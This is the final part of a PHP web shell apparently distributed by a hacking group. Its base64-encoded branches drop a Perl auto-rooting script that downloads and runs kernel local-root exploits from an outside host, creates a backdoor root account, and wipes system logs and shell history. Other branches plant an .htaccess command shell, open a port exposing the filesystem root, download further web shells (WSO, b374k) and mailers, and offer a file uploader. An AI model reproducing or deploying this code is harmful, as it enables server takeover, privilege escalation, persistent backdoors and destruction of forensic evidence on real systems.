NCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Jvb3QucHkiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHJvb3QucHkiKTsNCnN5c3RlbSgiLi9yb290LnB5Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3J1bngiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHJ1bngiKTsNCnN5c3RlbSgiLi9ydW54Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Rpdm9saSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgdGl2b2xpIik7DQpzeXN0ZW0oIi4vdGl2b2xpIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3VidW50dSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgdWJ1bnR1Iik7DQpzeXN0ZW0oIi4vdWJ1bnR1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Ztc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOw0Kc3lzdGVtKCJjaG1vZCA3Nzcgdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oIi4vdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3oxZC0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyB6MWQtMjAxMSIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnByaW50ICJnZXQgcm9vdC4uLj8/P1xuIjsNCnByaW50ICIjPVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXT0jXG4iOw0KcHJpbnQgInwgICAgICAgICAgICAgVGhhbmtzIEZvciBVc2luZyBpdCAgICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfFxuIjsNCnByaW50ICJ8ICAgICAgIEpvaW4gdXMgb24gaHR0cDovL3RoZWNyb3dzY3Jldy5vcmcgICAgICAgICB8XG4iOw0KcHJpbnQgIiM9WytdPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09WytdPSNcbiI7DQoNCn0NCmlmICgkQVJHVlswXSA9fiAiZGVsIiApIA0Kew0Kc3lzdGVtKCJybSAxLTIiKTsNCnN5c3RlbSgicm0gMS0zIik7DQpzeXN0ZW0oInJtIDEtNCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMzc0LjEyLjEuZWw1LTIwMTIiKTsNCnN5c3RlbSgicm0gMTAiKTsNCnN5c3RlbSgicm0gMTEiKTsNCnN5c3RlbSgicm0gMTIiKTsNCnN5c3RlbSgicm0gMTQiKTsNCnN5c3RlbSgicm0gMTUuc2giKTsNCnN5c3RlbSgicm0gMTUxNTAiKTsNCnN5c3RlbSgicm0gMTUyMDAiKTsNCnN5c3RlbSgicm0gMTYiKTsNCnN5c3RlbSgicm0gMTYtMSIpOw0Kc3lzdGVtKCJybSAxOCIpOw0Kc3lzdGVtKCJybSAxOC01Iik7DQpzeXN0ZW0oInJtIDIiKTsNCnN5c3RlbSgicm0gMi0xIik7DQpzeXN0ZW0oInJtIDItNi0zMi00Ni0yMDExIik7DQpzeXN0ZW0oInJtIDItNi0zNyIpOw0Kc3lzdGVtKCJybSAyLTYtOS0yMDA1Iik7DQpzeXN0ZW0oInJtIDItNi05LTIwMDYiKTsNCnN5c3RlbSgicm0gMi4zNC0yMDExRXhwbG9pdDEiKTsNCnN5c3RlbSgicm0gMi40LjIxLTIwMDYiKTsNCnN5c3RlbSgicm0gMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgicm0gMi42LjE4LTE5NCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMTk0LjEtMjAxMCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMTk0LjItMjAxMCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMjAxMSIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMjc0LTIwMTEiKTsNCnN5c3RlbSgicm0gMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgicm0gMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oInJtIDIuNi4yMCIpOw0Kc3lzdGVtKCJybSAyLjYuMjAtMiIpOw0Kc3lzdGVtKCJybSAyLjYuMjIiKTsNCnN5c3RlbSgicm0gMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgicm0gMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCJybSAyLjYuMjMtMi42LjI0Iik7DQpzeXN0ZW0oInJtIDIuNi4yMy0yLjYuMjRfMiIpOw0Kc3lzdGVtKCJybSAyLjYuMjMtMi42LjI3Iik7DQpzeXN0ZW0oInJtIDIuNi4yNCIpOw0Kc3lzdGVtKCJybSAyLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgicm0gMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgicm0gMi42LjMyLTQ2LjEuQkhzbXAiKTsNCnN5c3RlbSgicm0gMi42LjMzIik7DQpzeXN0ZW0oInJtIDIuNi4zMy0yMDExIik7DQpzeXN0ZW0oInJtIDIuNi4zNC0yMDExIik7DQpzeXN0ZW0oInJtIDIuNi4zNC0yMDExRXhwbG9pdDEiKTsNCnN5c3RlbSgicm0gMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCJybSAyLjYuMzciKTsNCnN5c3RlbSgicm0gMi42LjM3LXJjMiIpOw0Kc3lzdGVtKCJybSAyLjYuNV9ob29seXNoaXQiKTsNCnN5c3RlbSgicm0gMi42LjYtMzQiKTsNCnN5c3RlbSgicm0gMi42LjYtMzRfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oInJtIDIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJybSAyLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgicm0gMi42LjgtMjAwOC45LTY3LTIwMDgiKTsNCnN5c3RlbSgicm0gMi42LjgtNV9oMDBseXNoaXQiKTsNCnN5c3RlbSgicm0gMi42LjhfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oInJtIDIuNi45Iik7DQpzeXN0ZW0oInJtIDIuNi45LTIwMDQiKTsNCnN5c3RlbSgicm0gMi42LjktMjAwOCIpOw0Kc3lzdGVtKCJybSAyLjYuOS0zNCIpOw0Kc3lzdGVtKCJybSAyLjYuOS00Mi4wLjMuRUxzbXAiKTsNCnN5c3RlbSgicm0gMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgicm0gMi42LjktNTUiKTsNCnN5c3RlbSgicm0gMi42LjktNTUtMjAwNy1wcnY4Iik7DQpzeXN0ZW0oInJtIDIuNi45LTU1LTIwMDgtcHJ2OCIpOw0Kc3lzdGVtKCJybSAyLjYuOS02NzIwMDgiKTsNCnN5c3RlbSgicm0gMi42LjkuMiIpOw0Kc3lzdGVtKCJybSAyLjYuOTEtMjAwNyIpOw0Kc3lzdGVtKCJybSAyMDA3Iik7DQpzeXN0ZW0oInJtIDIwMDktbG9jYWwiKTsNCnN5c3RlbSgicm0gMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgicm0gMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7DQpzeXN0ZW0oInJtIDIxIik7DQpzeXN0ZW0oInJtIDMiKTsNCnN5c3RlbSgicm0gMy40LjYtOS0yMDA3Iik7DQpzeXN0ZW0oInJtIDMxIik7DQpzeXN0ZW0oInJtIDM2LXJjMSIpOw0Kc3lzdGVtKCJybSA0Iik7DQpzeXN0ZW0oInJtIDQ0Iik7DQpzeXN0ZW0oInJtIDQ3Iik7DQpzeXN0ZW0oInJtIDUiKTsNCnN5c3RlbSgicm0gNTAiKTsNCnN5c3RlbSgicm0gNTQiKTsNCnN5c3RlbSgicm0gNiIpOw0Kc3lzdGVtKCJybSA2NyIpOw0Kc3lzdGVtKCJybSA3Iik7DQpzeXN0ZW0oInJtIDctMiIpOw0Kc3lzdGVtKCJybSA3eCIpOw0Kc3lzdGVtKCJybSA4Iik7DQpzeXN0ZW0oInJtIDkiKTsNCnN5c3RlbSgicm0gOTAiKTsNCnN5c3RlbSgicm0gOTQiKTsNCnN5c3RlbSgicm0gTGludXhfMi42KDEpLjEyIik7DQpzeXN0ZW0oInJtIExpbnV4XzIuNi4xMiIpOw0Kc3lzdGVtKCJybSBMaW51eF8yLjYuOS1qb29seXNoaXQiKTsNCnN5c3RlbSgicm0gYWNpZCIpOw0Kc3lzdGVtKCJybSBkM3ZpbCIpOw0Kc3lzdGVtKCJybSBleHAxIik7DQpzeXN0ZW0oInJtIGV4cDIiKTsNCnN5c3RlbSgicm0gZXhwMyIpOw0Kc3lzdGVtKCJybSBleHBsb2l0Iik7DQpzeXN0ZW0oInJtIGZ1bGwtbmVsc29uIik7DQpzeXN0ZW0oInJtIGdheXJvcyIpOw0Kc3lzdGVtKCJybSBsZW5pcy5zaCIpOw0Kc3lzdGVtKCJybSBsb2NhbC0yLjYuOS0yMDA1LTIwMDYiKTsNCnN5c3RlbSgicm0gbG9jYWwtcm9vdC1leHBsb2l0LWdheXJvcyIpOw0Kc3lzdGVtKCJybSBwcml2NCIpOw0Kc3lzdGVtKCJybSBwd25rZXJuZWwiKTsNCnN5c3RlbSgicm0gcm9vdC5weSIpOw0Kc3lzdGVtKCJybSBydW54Iik7DQpzeXN0ZW0oInJtIHRpdm9saSIpOw0Kc3lzdGVtKCJybSB1YnVudHUiKTsNCnN5c3RlbSgicm0gdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oInJtIHoxZC0yMDExIik7DQpwcmludCAiIz1bK109PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1bK109I1xuIjsNCnByaW50ICJ8ICAgICAgICAgICAgIFRoYW5rcyBGb3IgVXNpbmcgaXQgICAgICAgICAgICAgICAgICB8XG4iOw0KcHJpbnQgInwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCAgICAgICBKb2luIHVzIG9uIGh0dHA6Ly90aGVjcm93c2NyZXcub3JnICAgICAgICAgfFxuIjsNCnByaW50ICIjPVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXT0jXG4iOw0KDQp9DQppZiAoJEFSR1ZbMF0gPX4gImFkZCIgKSANCg0Kew0KcHJpbnQgIkFkZCBVc2VyIFJvb3QgOkRcbiI7DQpwcmludCAidXNlciA6IFsgZ2FiYnkgXVxuIjsNCnN5c3RlbSAiYWRkdXNlciAtZyAwIGdhYmJ5IC1HIHdoZWVsLHN5cyxiaW4sZGFlbW9uLGFkbSxkaXNrIC1kIC9zZjcgLXMgL2Jpbi9zaCI7DQpzeXN0ZW0gInBhc3N3ZCByMDB0MTIzIjsNCnByaW50ICJwYXNzIGlzIDogcjAwdDEyM1xuIjsgDQpwcmludCAiIz1bK109PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1bK109I1xuIjsNCnByaW50ICJ8ICAgICAgICAgICAgIFRoYW5rcyBGb3IgVXNpbmcgaXQgICAgICAgICAgICAgICAgICB8XG4iOw0KcHJpbnQgInwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCAgICAgICBKb2luIHVzIG9uIGh0dHA6Ly90aGVjcm93c2NyZXcub3JnICAgICAgICAgfFxuIjsNCnByaW50ICIjPVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXT0jXG4iOw0KDQp9DQppZiAoJEFSR1ZbMF0gPX4gInJtIiApIA0KDQp7DQpwcmludCAicm0gLXJmIExvZy4uLlxuIjsNCnN5c3RlbSAicm0gLXJmIC90bXAvbG9ncyI7DQpzeXN0ZW0gInJtIC1yZiAvcm9vdC8ua3NoX2hpc3RvcnkiOw0Kc3lzdGVtICJybSAtcmYgL3Jvb3QvLmJhc2hfaGlzdG9yeSI7DQpzeXN0ZW0gInJtIC1yZiAvcm9vdC8uYmFzaF9sb2dvdXQiOw0Kc3lzdGVtICJybSAtcmYgL3Vzci9sb2NhbC9hcGFjaGUvbG9ncyI7DQpzeXN0ZW0gInJtIC1yZiAvdXNyL2xvY2FsL2FwYWNoZS9sb2ciOw0Kc3lzdGVtICJybSAtcmYgL3Zhci9hcGFjaGUvbG9ncyI7DQpzeXN0ZW0gInJtIC1yZiAvdmFyL2FwYWNoZS9sb2ciOw0Kc3lzdGVtICJybSAtcmYgL3Zhci9ydW4vdXRtcCI7DQpzeXN0ZW0gInJtIC1yZiAvdmFyL2xvZ3MiOw0Kc3lzdGVtICJybSAtcmYgL3Zhci9sb2ciOw0Kc3lzdGVtICJybSAtcmYgL3Zhci9hZG0iOw0Kc3lzdGVtICJybSAtcmYgL2V0Yy93dG1wIjsNCnN5c3RlbSAicm0gLXJmIC9ldGMvdXRtcCI7DQpzeXN0ZW0gImNkIC9iaW4iOw0KcHJpbnQgIlx0TG9nIERlbGV0ZWQgTWFzIE1ibG8gOkQuLiBcblxuIjsNCnByaW50ICIjPVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXT0jXG4iOw0KcHJpbnQgInwgICAgICAgICAgICAgVGhhbmtzIEZvciBVc2luZyBpdCAgICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfFxuIjsNCnByaW50ICJ8ICAgICAgIEpvaW4gdXMgb24gaHR0cDovL3RoZWNyb3dzY3Jldy5vcmcgICAgICAgICB8XG4iOw0KcHJpbnQgIiM9WytdPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09WytdPSNcbiI7DQoNCn0NCiMgQ29kZWQgQnkgR2FiYnkgLSBJbmRvbmVzaWEgRmVtYWxlIEhhY2tlciovIA0K";
                                            file_put_contents("r00t.pl",base64_decode($perlrot));
                                            echo "<script>alert('Perl Auto R00ting Created'); hideAll();</script>";
                                            die();
                                        }
                                        elseif ( $pilih == 'slc') {
                                            $slc ="IyEvYmluL3NoDQojIENvZGVkIEJ5IFJlZCBINHQgViFwZXIgKEJlbmlfVmFuZGEpDQojIEdyMzN0eiA6IEFsbCBNZW1iZXJzIE9mIElySXNUDQojIGNobW9kIDA3NTUgc2VydmVyTEMuc2ggPj4gLi9zZXJ2ZXJMQy5zaA0KDQplY2hvICJbKl0gR29pbmcgVE8gRGVsZXRlIExvZyBTZXJ2ZXJzIC4uLiAiDQpmaW5kIC8gLW5hbWUgKi5iYXNoX2hpc3RvcnkgLWV4ZWMgcm0gLXJmIHt9IFw7DQpmaW5kIC8gLW5hbWUgKi5iYXNoX2xvZ291dCAtZXhlYyBybSAtcmYge30gXDsNCmZpbmQgLyAtbmFtZSAibG9nKiIgLWV4ZWMgcm0gLXJmIHt9IFw7DQpmaW5kIC8gLW5hbWUgKi5sb2cgLWV4ZWMgcm0gLXJmIHt9IFw7DQpybSAtcmYgL3RtcC9sb2dzDQpybSAtcmYgJEhJU1RGSUxFDQpybSAtcmYgL3Jvb3QvLmtzaF9oaXN0b3J5DQpybSAtcmYgL3Jvb3QvLmJhc2hfaGlzdG9yeQ0Kcm0gLXJmIC9yb290Ly5rc2hfaGlzdG9yeQ0Kcm0gLXJmIC9yb290Ly5iYXNoX2xvZ291dA0Kcm0gLXJmIC91c3IvbG9jYWwvYXBhY2hlL2xvZ3MNCnJtIC1yZiAvdXNyL2xvY2FsL2FwYWNoZS9sb2cNCnJtIC1yZiAvdmFyL2FwYWNoZS9sb2dzDQpybSAtcmYgL3Zhci9hcGFjaGUvbG9nDQpybSAtcmYgL3Zhci9ydW4vdXRtcA0Kcm0gLXJmIC92YXIvbG9ncw0Kcm0gLXJmIC92YXIvbG9nDQpybSAtcmYgL3Zhci9hZG0NCnJtIC1yZiAvZXRjL3d0bXANCnJtIC1yZiAvZXRjL3V0bXANCg0KZWNobyAiWypdIERvbmUgLiBHb29kIEx1Y2sgOyki";
                                            file_put_contents("serverLC.sh",base64_decode($slc));
                                            echo "<script>alert('Server Log Cleaner [ serverLC.sh ] Created'); hideAll();</script>";
                                            die();
                                        }
                                        elseif ( $pilih == 'htasell') {
                                            $ht = 'PEZpbGVzIH4gIl5cLmh0Ij4NCk9yZGVyIGFsbG93LGRlbnkNCkFsbG93IGZyb20gYWxsDQo8L2ZpbGVzPg0KQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAuaHRhY2Nlc3MNCiMgPD9waHAgcGFzc3RocnUoJF9HRVRbJ2NtZCddKTs/Pg0K';
                                            file_put_contents(".htaccess",base64_decode($ht));
                                            echo "<script>alert('htaccess Shell [ .htaccess ] Created : open in site/.htaccess?cmd= '); hideAll();</script>";
                                            die();
                                        }
                                        elseif ( $pilih == 'port') {
                                            $openport = 'IyEvdXNyYmluL2VudiBweXRob24NCiMgZGV2aWx6YzBkZS5vcmcgKGMpIDIwMTINCiMgcmVjb2RlZCBieSB4JzFuNzNjdCAoYykgMjAxMw0KDQppbXBvcnQgU2ltcGxlSFRUUFNlcnZlcg0KaW1wb3J0IFNvY2tldFNlcnZlcg0KaW1wb3J0IG9zDQoNCnBvcnQgPSAxMzEyMw0KDQppZl9fbmFtZV9fPT0nX19tYWluX18nOg0KCW9zLmNoZGlyKCcvJykNCglIYW5kbGVyID0gU2ltcGxlSFRUUFNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXINCglodHRwZCA9IFNvY2tldFNlcnZlci5UQ1BTZXJ2ZXIoKCIiLHBvcnQpLCBIYW5kbGVyKQ0KCQ0KCXByaW50KCJOb3cgb3BlbiB0aGlzIHNlcnZlciBvbiB3ZWIgYnJvd3NlciBhdCBwb3J0OiAiICsgc3RyKHBvcnQpKQ0KCXByaW50KCJleGFtcGxlOiBodHRwOi8vd3d3LmZiaS5nb3Y6IiArIHN0cihwb3J0KSkNCglodHRwLnNlcnZlX2ZvcmV2ZXIoKQ==';
                                            file_put_contents("port.py",base64_decode($openport));
                                            chmod("port.py",0755);
                                            echo "<script>alert('Python Open Port 13123 [ port.py ] Created'); hideAll();</script>";
                                            die();
                                        }
                                    }

                                    ?>
                                    <?php

                                    if ( $_GET['create'] == 'sabunmassal' ){
                                        $a= "".$_SERVER['SERVER_NAME'].""; $b= dirname($_SERVER['PHP_SELF']);$c = "/tools/sabun1.php";
                                        error_reporting(0);
                                        if (file_exists('tools/sabun1.php')) {
                                            echo '<br>Location : <br>'.$pwd.'tools/sabun1.php' ;
                                            echo '<script type="text/javascript">
alert("Done");
window.location.href = "tools/sabun1.php";
</script> ';
                                        } else {
                                            mkdir("tools", 0777);
                                            file_put_contents('tools/sabun1.php', file_get_contents('https://sites.google.com/site/bhshll123/sabunhsh.txt'));
                                            echo ' <script type="text/javascript">
alert("Done");
window.location.href = "tools/sabun1.php";
</script> ';
                                        }



                                    }
                                    ?>
                                    <?php
                                    if ( $_GET['create'] == 'wso' ){
                                        $a= "".$_SERVER['SERVER_NAME'].""; $b= dirname($_SERVER['PHP_SELF']);$c = "/tools/sabun1.php";
                                        error_reporting(0);
                                        if (file_exists('tools/wso.php')) {
                                            echo '<br>Location : <br>'.$pwd.'tools/wso.php' ;
                                            echo '<script type="text/javascript">
alert("Done");
window.location.href = "tools/wso.php";
</script> ';
                                        } else {
                                            mkdir("tools", 0777);
                                            file_put_contents('tools/wso.php', file_get_contents('https://sites.google.com/site/bhshll123/wso.txt'));
                                            echo ' <script type="text/javascript">
alert("Done");
window.location.href = "tools/wso.php";
</script> ';
                                        }



                                    }
                                    ?>
                                    <?php
                                    if ( $_GET['create'] == '1n73' ){
                                        $a= "".$_SERVER['SERVER_NAME'].""; $b= dirname($_SERVER['PHP_SELF']);$c = "/tools/1n73.php";
                                        error_reporting(0);
                                        if (file_exists('tools/1n73.php')) {
                                            echo '<br>Location : <br>'.$pwd.'tools/1n73.php' ;
                                            echo '<script type="text/javascript">
alert("Done , password :bh");
window.location.href = "tools/1n73.php";
</script> ';
                                        } else {
                                            mkdir("tools", 0777);
                                            file_put_contents('tools/1n73.php', file_get_contents('https://sites.google.com/site/bhshll123/injection.txt'));
                                            echo ' <script type="text/javascript">
alert("Done , password :bh");
window.location.href = "tools/1n73.php";
</script> ';
                                        }



                                    }
                                    ?>
                                    <?php
                                    $name = 'wk';
                                    if ( $_GET['create'] == $name ){
                                        $a= "".$_SERVER['SERVER_NAME'].""; $b= dirname($_SERVER['PHP_SELF']);$c = "/tools/".$name.".php";
                                        error_reporting(0);
                                        if (file_exists('tools/'.$name.'.php')) {
                                            echo '<br>Location : <br>'.$pwd.'tools/'.$name.'php' ;
                                            echo '<script type="text/javascript">
alert("Done");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        } else {
                                            mkdir("tools", 0777);
                                            file_put_contents('tools/'.$name.'.php', file_get_contents('https://sites.google.com/site/bhshll123/'.$name.'.txt'));
                                            echo ' <script type="text/javascript">
alert("Done");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        }



                                    }
                                    ?>
                                    <?php
                                    $name = 'adminer';
                                    if ( $_GET['create'] == $name ){
                                        $a= "".$_SERVER['SERVER_NAME'].""; $b= dirname($_SERVER['PHP_SELF']);$c = "/tools/".$name.".php";
                                        error_reporting(0);
                                        if (file_exists('tools/'.$name.'.php')) {
                                            echo '<br>Location : <br>'.$pwd.'tools/'.$name.'php' ;
                                            echo '<script type="text/javascript">
alert("Done");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        } else {
                                            mkdir("tools", 0777);
                                            file_put_contents('tools/'.$name.'.php', file_get_contents('https://sites.google.com/site/bhshll123/'.$name.'.txt'));
                                            echo ' <script type="text/javascript">
alert("Done");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        }



                                    }
                                    ?>
                                    <?php
                                    $name = 'b374k';
                                    if ( $_GET['create'] == $name ){
                                        $a= "".$_SERVER['SERVER_NAME'].""; $b= dirname($_SERVER['PHP_SELF']);$c = "/tools/".$name.".php";
                                        error_reporting(0);
                                        if (file_exists('tools/'.$name.'.php')) {
                                            echo '<br>Location : <br>'.$pwd.'tools/'.$name.'php' ;
                                            echo '<script type="text/javascript">
alert("Done passw b374k");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        } else {
                                            mkdir("tools", 0777);
                                            file_put_contents('tools/'.$name.'.php', file_get_contents('https://sites.google.com/site/bhshll123/'.$name.'.txt'));
                                            echo ' <script type="text/javascript">
alert("Done passw b374k");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        }



                                    }
                                    ?>
                                    <?php
                                    $name = 'ppmailceker';
                                    if ( $_GET['create'] == $name ){
                                        $a= "".$_SERVER['SERVER_NAME'].""; $b= dirname($_SERVER['PHP_SELF']);$c = "/tools/".$name.".php";
                                        error_reporting(0);
                                        if (file_exists('tools/'.$name.'.php')) {
                                            echo '<br>Location : <br>'.$pwd.'tools/'.$name.'php' ;
                                            echo '<script type="text/javascript">
alert("Done");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        } else {
                                            mkdir("tools", 0777);
                                            file_put_contents('tools/'.$name.'.php', file_get_contents('https://sites.google.com/site/bhshll123/'.$name.'.txt'));
                                            echo ' <script type="text/javascript">
alert("Done");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        }



                                    }
                                    ?>
                                    <?php
                                    $name = 'promailerv2';
                                    if ( $_GET['create'] == $name ){
                                        $a= "".$_SERVER['SERVER_NAME'].""; $b= dirname($_SERVER['PHP_SELF']);$c = "/tools/".$name.".php";
                                        error_reporting(0);
                                        if (file_exists('tools/'.$name.'.php')) {
                                            echo '<br>Location : <br>'.$pwd.'tools/'.$name.'php' ;
                                            echo '<script type="text/javascript">
alert("Done");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        } else {
                                            mkdir("tools", 0777);
                                            file_put_contents('tools/'.$name.'.php', file_get_contents('https://sites.google.com/site/bhshll123/'.$name.'.txt'));
                                            echo ' <script type="text/javascript">
alert("Done");
window.location.href = "tools/'.$name.'.php";
</script> ';
                                        }



                                    }
                                    ?>
                                    <?php
                                    function rooting()
                                    {
                                        echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';
                                        echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
                                        echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
                                        if( $_POST['_upl'] == "Upload" ) {
                                            if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; }
                                            else { echo '<b>Basarisiz</b><br><br>'; }
                                        }
                                    }
                                    $x = $_GET["x"];
                                    Switch($x){
                                        case "rooting";
                                            rooting();
                                            break;

                                    }
                                    ?>
                                    </td></tr>
                                <br><br><div class="info">We Are <a href="http://facebook.com/groups/bd.level.7"><font color="aqua">BD_LEVEL_7</font></a></div><br>
                                <div class="jaya">&copy; 2017 - Sid Gifari </div></center><br><br>
                        </script>
                        </div>
                        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpn0%2fEs018j9xTQtOiNWdNpNkQSvfteUTNIMAh8w%2bg7A%2fhTKTa2LJuaNMa8KjsTW2RQ9sAf1lGqT36oWCrTCEUd7XnaGx95gELuSYCenO4sWeJ%2fj1an6pj%2b1Oe8A1gbFlwsq0KbBnke6sbxbKD5YwsQGr5wpN7OtVeMOhPJQmKJ9OWz%2f0uZd5isWCyFGiInPBO91eyn1iuwernNYELNf0OHaGouPiFqzTJvCTzLEah5iCNWk1GY5Y05K0c7Agu9nam96MJ3B3uYvcCCShBIsTvIUc4klyRfeS1IeXIuXV6lwhEI6r0eeatFm6FGmIEUN5ui5Gho4pG9zZD5GNpiInJR36mv8xeiOw%2fZbZAPLTgnewk56heEgb1vM4ymcAWoCHJBf48m%2fiubPrd5sdELeyAowtRx1PlgNSrdOBeArOlm6q9llxccCcLZfDYaAU5QtzvVhmf1EbzZTJ9gPbit7tRMPyS7uWr2T7hP4Zd8st9bQpCuX7AZEU4C8FilyX5OWoZoGCftnaBUA83nPuSyx4%2bafOGEtx2%2fng0cggx015Lb1wWv1dAOktUBr8u1Hf59KjVXy03Q3qrjDvuXFJRhwKzx6Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
